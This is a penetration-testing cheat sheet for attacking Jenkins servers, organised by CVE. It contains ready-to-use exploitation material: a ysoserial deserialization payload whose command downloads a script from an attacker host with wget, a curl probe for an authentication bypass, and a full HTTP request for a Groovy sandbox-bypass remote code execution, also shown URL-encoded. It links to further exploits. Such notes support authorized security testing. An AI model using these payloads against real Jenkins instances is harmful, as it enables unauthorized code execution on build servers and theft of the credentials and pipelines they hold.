## Jenkins
1. Deserialization RCE in old Jenkins (CVE-2015-8103, Jenkins 1.638 and older)

Use [ysoserial](https://github.com/frohoff/ysoserial) to generate a payload.
Then RCE using [this script](./rce/jenkins_rce_cve-2015-8103_deser.py):

```bash
java -jar ysoserial-master.jar CommonsCollections1 'wget myip:myport -O /tmp/a.sh' > payload.out
./jenkins_rce.py jenkins_ip jenkins_port payload.out
```

2. Authentication/ACL bypass (CVE-2018-1000861, Jenkins <2.150.1)

Details [here](https://blog.orange.tw/2019/01/hacking-jenkins-part-1-play-with-dynamic-routing.html).

If the Jenkins requests authentication but returns valid data using the following request, it is vulnerable:
```bash
curl -k -4 -s https://example.com/securityRealm/user/admin/search/index?q=a
```

3. Metaprogramming RCE in Jenkins Plugins (CVE-2019-1003000, CVE-2019-1003001, CVE-2019-1003002)

Original RCE vulnerability [here](https://blog.orange.tw/2019/02/abusing-meta-programming-for-unauthenticated-rce.html), full exploit [here](https://github.com/petercunha/jenkins-rce).

Alternative RCE with Overall/Read and Job/Configure permissions [here](https://github.com/adamyordan/cve-2019-1003000-jenkins-rce-poc).

4. CVE-2019-1003030

How to Exploit:
- [PacketStorm](https://packetstormsecurity.com/files/159603/Jenkins-2.63-Sandbox-Bypass.html)

```
GET /jenkinselj/securityRealm/user/admin/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript?sandbox=true&value=public class x {
  public x(){
"ping -c 1 xx.xx.xx.xx".execute()
}
} HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Cookie: JSESSIONID.4495c8e0=node01jguwrtw481dx1bf3gaoq5o6no32.node0
Connection: close
Upgrade-Insecure-Requests: 1
```
URL Encoding the following for RCE
```
public class x {
  public x(){
"ping -c 1 xx.xx.xx.xx".execute()
    }
}
```
to

%70%75%62%6c%69%63%20%63%6c%61%73%73%20%78%20%7b%0a%20%20%70%75%62%6c%69%63%20%78%28%29%7b%0a%22%70%69%6e%67%20%2d%63%20%31%20%78%78%2e%78%78%2e%78%78%2e%78%78%22%2e%65%78%65%63%75%74%65%28%29%0a%7d%0a%7d

5. Git plugin (<3.12.0) RCE in Jenkins (CVE-2019-10392)

How to exploit:
- [@jas502n](https://github.com/jas502n/CVE-2019-10392)
- [iwantmore.pizza](https://iwantmore.pizza/posts/cve-2019-10392.html)

Reference: 
- https://github.com/gquere/pwn_jenkins